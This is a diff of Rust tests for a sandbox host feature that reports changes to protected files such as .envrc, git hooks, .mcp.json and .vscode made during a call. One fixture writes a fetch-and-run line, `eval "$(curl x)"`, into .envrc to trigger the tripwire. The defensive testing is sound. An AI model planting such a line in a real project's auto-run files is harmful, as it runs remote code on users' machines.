@@ -1578,3 +1578,105 @@ fn a_bound_is_clamped_to_the_persons_ceiling_and_a_floor() {
     assert_eq!(f["memoryBound"], 256u64 << 20);
     h.close();
 }
+
+// --- the tripwire: what changed among the protected names during a call (`protectedChanged`) ---
+
+/// The names `protectedChanged` lists, with what happened to each.
+fn changes(v: &Value) -> Vec<(String, String)> {
+    v.as_array()
+        .unwrap_or_else(|| panic!("protectedChanged is a list: {v}"))
+        .iter()
+        .map(|c| (c["name"].as_str().unwrap().to_string(), c["change"].as_str().unwrap().to_string()))
+        .collect()
+}
+
+#[test]
+fn done_reports_an_empty_list_when_nothing_protected_changed() {
+    let (_d, r) = root();
+    let mut h = Host::start();
+    h.ok("configure", json!({ "roots": [r] }));
+    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "echo x > README.md; mkdir -p target"], "cwd": r }));
+    assert_eq!(d["protectedChanged"], json!([]), "present and empty, never absent: absent means an older host: {d}");
+    h.close();
+}
+
+#[test]
+fn done_reports_a_protected_change_made_during_the_call_by_anyone_and_never_reverts_it() {
+    let (_d, r) = root();
+    std::fs::create_dir_all(r.join(".git/hooks")).unwrap();
+    let mut h = Host::start();
+    h.ok("configure", json!({ "roots": [r] }));
+    let id = marker_call(&mut h, &r, 1, json!({}));
+    // Made by THIS process while the call runs: the tripwire reports what changed during the call, not by it.
+    std::fs::write(r.join(".envrc"), "eval \"$(curl x)\"").unwrap();
+    std::fs::write(r.join(".git/hooks/pre-push"), "#!/bin/sh\n").unwrap();
+    let d = h.done(&id);
+    assert_eq!(
+        changes(&d["protectedChanged"]),
+        vec![
+            (".envrc".into(), "created".into()),
+            (".git/hooks".into(), "modified".into()),
+            (".git/hooks/pre-push".into(), "created".into()),
+        ],
+        "{d}"
+    );
+    assert_eq!(d["protectedChanged"][0]["root"], json!(r.to_string_lossy()));
+    assert!(r.join(".envrc").exists() && r.join(".git/hooks/pre-push").exists(), "report-only: nothing is reverted");
+    h.close();
+}
+
+#[test]
+fn the_linux_floor_gap_is_reported_and_a_refused_write_reports_nothing() {
+    let (_d, r) = root();
+    let mut h = Host::start();
+    if !h.sandbox_available() {
+        return h.close();
+    }
+    h.ok("configure", json!({ "roots": [r] }));
+    // No envelope: today's floor. The report matches what is on disk afterwards, on both OSes.
+    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "echo x > .envrc"], "cwd": r }));
+    let reported = changes(&d["protectedChanged"]);
+    if r.join(".envrc").exists() {
+        assert_eq!(reported, vec![(".envrc".into(), "created".into())], "the floor's gap is reported: {d}");
+    } else {
+        assert_eq!(reported, vec![], "the sandbox refused the write, so nothing changed: {d}");
+    }
+    h.close();
+}
+
+#[test]
+fn every_stage_of_a_pipe_reports_the_pipes_changes() {
+    let (_d, r) = root();
+    let mut h = Host::start();
+    h.ok("configure", json!({ "roots": [r] }));
+    let a = h.ok("spawn", json!({ "argv": ["sh", "-c", "touch started; sleep 1; echo a"], "cwd": r }))["id"]
+        .as_str()
+        .unwrap()
+        .to_string();
+    let b = h.ok("spawn", json!({ "argv": ["cat"], "cwd": r }))["id"].as_str().unwrap().to_string();
+    h.ok("pipe", json!({ "ids": [a, b] }));
+    assert!(appears(&r.join("started"), 5000));
+    std::fs::write(r.join(".mcp.json"), "{}").unwrap();
+    for id in [&a, &b] {
+        let d = h.done(id);
+        assert_eq!(changes(&d["protectedChanged"]), vec![(".mcp.json".into(), "created".into())], "{id}: {d}");
+    }
+    h.close();
+}
+
+#[test]
+fn a_live_orphan_in_status_reports_what_changed_so_far() {
+    let (_d, r) = root();
+    let state = tempfile::tempdir().unwrap();
+    let dir = state.path().join("owners");
+    let mut h = Host::start_in(&dir, &[]);
+    h.ok("configure", json!({ "roots": [r] }));
+    marker_call(&mut h, &r, 3, json!({ "onOwnerLoss": "orphan", "orphanTimeoutMs": 60_000 }));
+    h.close();
+    std::fs::create_dir(r.join(".vscode")).unwrap();
+    let mut next = Host::start_in(&dir, &[]);
+    let st = next.ok("status", json!({}));
+    let o = &st["orphans"][0];
+    assert_eq!(changes(&o["protectedChanged"]), vec![(".vscode".into(), "created".into())], "{st}");
+    next.close();
+}
